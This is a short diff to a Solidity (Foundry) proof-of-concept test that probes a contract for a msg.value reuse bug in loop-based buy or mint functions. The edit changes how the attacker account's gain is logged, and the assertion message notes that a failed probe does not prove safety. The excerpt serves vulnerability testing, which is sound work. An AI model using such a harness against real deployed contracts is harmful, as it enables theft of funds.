@@ -61,7 +61,11 @@ contract PoC is Test {
         if (bytes(used).length == 0) used = _attemptBuy(attackerEOA, "mintMany(uint256)", abi.encodeWithSignature("mintMany(uint256)", uint256(3)));
 
         console.log("entry point that leaked value:", used);
-        console.log("attacker net outflow for 3 items:", before - attackerEOA.balance);
+        // Signed delta: on success the loop hands msg.value back PER
+        // ITERATION, so the attacker's balance can RISE above `before` --
+        // an unsigned before - balance underflows (Panic 0x11) on exactly
+        // the path that should report the profit. Negative = attacker gained.
+        console.log("attacker net outflow for 3 items:", int256(before) - int256(attackerEOA.balance));
         assertTrue(
             bytes(used).length > 0,
             "no loop entry point leaked per-iteration msg.value. Tried buy(uint256), mint(uint256), purchase(uint256), buyItems(uint256), mintMany(uint256). This does NOT establish safety: the function may be named differently, take other arguments, or reference msg.value only once."
